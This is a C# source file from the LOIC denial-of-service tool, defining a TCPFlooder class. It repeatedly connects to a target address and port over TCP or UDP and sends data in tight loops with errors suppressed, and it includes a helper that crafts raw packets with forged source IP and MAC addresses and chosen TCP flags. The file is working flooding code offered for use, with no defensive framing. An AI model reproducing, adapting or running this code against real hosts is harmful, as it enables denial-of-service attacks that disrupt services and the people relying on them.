using PcapDotNet.Base;
using PcapDotNet.Packets;
using PcapDotNet.Packets.Ethernet;
using PcapDotNet.Packets.IpV4;
using PcapDotNet.Packets.Transport;
using System;
using System.ComponentModel;
using System.Net;
using System.Net.Sockets;
using System.Text;
using AddressFamily = System.Net.Sockets.AddressFamily;

namespace LOIC
{
	public class TCPFlooder
	{
		public TCPFlooder(string ip, int port, int proto, int delay, bool resp, string data, bool random)
		{
			this.IP = ip;
			this.Port = port;
			this.Protocol = proto;
			this.Delay = delay;
			this.Resp = resp;
			this.Data = data;
			this.AllowRandom = random;
		}

		public bool IsFlooding;
		public int FloodCount;
		public string IP;
		public int Port;
		public int Protocol;
		public int Delay;
		public bool Resp;
		public string Data;
		private bool AllowRandom;

		public void Start()
		{
			IsFlooding = true;
			BackgroundWorker bw = new BackgroundWorker();
			bw.DoWork += new DoWorkEventHandler(bw_DoWork);
			bw.RunWorkerAsync();
		}

		private void bw_DoWork(object sender, DoWorkEventArgs e)
		{
			try
			{
				byte[] buf;
				IPEndPoint RHost = new System.Net.IPEndPoint(System.Net.IPAddress.Parse(IP), Port);
				while (IsFlooding)
				{
					Socket socket = null;
					if (Protocol == 1)
					{
						socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
						socket.NoDelay = true;

						try { socket.Connect(RHost); }
						catch { continue; }

						socket.Blocking = Resp;
						try
						{
							while (IsFlooding)
							{
								FloodCount++;
								buf = System.Text.Encoding.ASCII.GetBytes(String.Concat(Data, (AllowRandom ? Functions.RandomString() : null)));
								socket.Send(buf);
								if (Delay >= 0) System.Threading.Thread.Sleep(Delay + 1);
							}
						}
						catch { }
					}
					if (Protocol == 2)
					{
						socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
						socket.Blocking = Resp;
						try
						{
							while (IsFlooding)
							{
								FloodCount++;
								buf = System.Text.Encoding.ASCII.GetBytes(String.Concat(Data, (AllowRandom ? Functions.RandomString() : null)));
								socket.SendTo(buf, SocketFlags.None, RHost);
								if (Delay >= 0) System.Threading.Thread.Sleep(Delay + 1);
							}
						}
						catch { }
					}
				}
			}
			catch { }
		}

		private Packet BuildTcpPacket(string SourceIP, string DestIP, int sourceport, int destport, string payload, bool syn, bool ack, bool fin, bool rst, bool urg, bool psh, bool cwr, bool enc, bool ns, bool none, string srcMac, string dstMac, ushort id, byte ttl, uint ackNum, uint seqNum, ushort winNum)
		{
			EthernetLayer ethernetLayer = new EthernetLayer
			{
				Source = new MacAddress(srcMac),
				Destination = new MacAddress(dstMac),
				EtherType = EthernetType.None, // Will be filled automatically.
			};

			IpV4Layer ipV4Layer = new IpV4Layer
			{
				Source = new IpV4Address(SourceIP),
				CurrentDestination = new IpV4Address(DestIP),
				Fragmentation = IpV4Fragmentation.None,
				HeaderChecksum = null, // Will be filled automatically.
				Identification = id,
				Options = IpV4Options.None,
				Protocol = null, // Will be filled automatically.
				Ttl = ttl,
				TypeOfService = 0,
			};

			// flag fun here later
			TcpLayer tcpLayer = new TcpLayer();
			tcpLayer.SourcePort = (ushort)sourceport;
			tcpLayer.DestinationPort = (ushort)destport;
			tcpLayer.Checksum = null;// Will be filled automatically.
			tcpLayer.SequenceNumber = seqNum;
			tcpLayer.AcknowledgmentNumber = ackNum;
			if (syn)
				tcpLayer.ControlBits = TcpControlBits.Synchronize;
			if (ack)
				tcpLayer.ControlBits = TcpControlBits.Acknowledgment;
			if (fin)
				tcpLayer.ControlBits = TcpControlBits.Fin;
			if (rst)
				tcpLayer.ControlBits = TcpControlBits.Reset;
			if (urg)
				tcpLayer.ControlBits = TcpControlBits.Urgent;
			if (psh)
				tcpLayer.ControlBits = TcpControlBits.Push;
			if (cwr)
				tcpLayer.ControlBits = TcpControlBits.CongestionWindowReduced;
			if (enc)
				tcpLayer.ControlBits = TcpControlBits.ExplicitCongestionNotificationEcho;
			if (ns)
				tcpLayer.ControlBits = TcpControlBits.NonceSum; // not a flag, rather a tcp header bit set
			if (none)
				tcpLayer.ControlBits = TcpControlBits.None;

			tcpLayer.Window = winNum;
			tcpLayer.UrgentPointer = 0;
			tcpLayer.Options = TcpOptions.None;

			PayloadLayer payloadLayer = new PayloadLayer
			{
				Data = new Datagram(Encoding.ASCII.GetBytes(payload)),
			};

			PacketBuilder builder = new PacketBuilder(ethernetLayer, ipV4Layer, tcpLayer, payloadLayer);

			return builder.Build(DateTime.Now);
		}
	}
}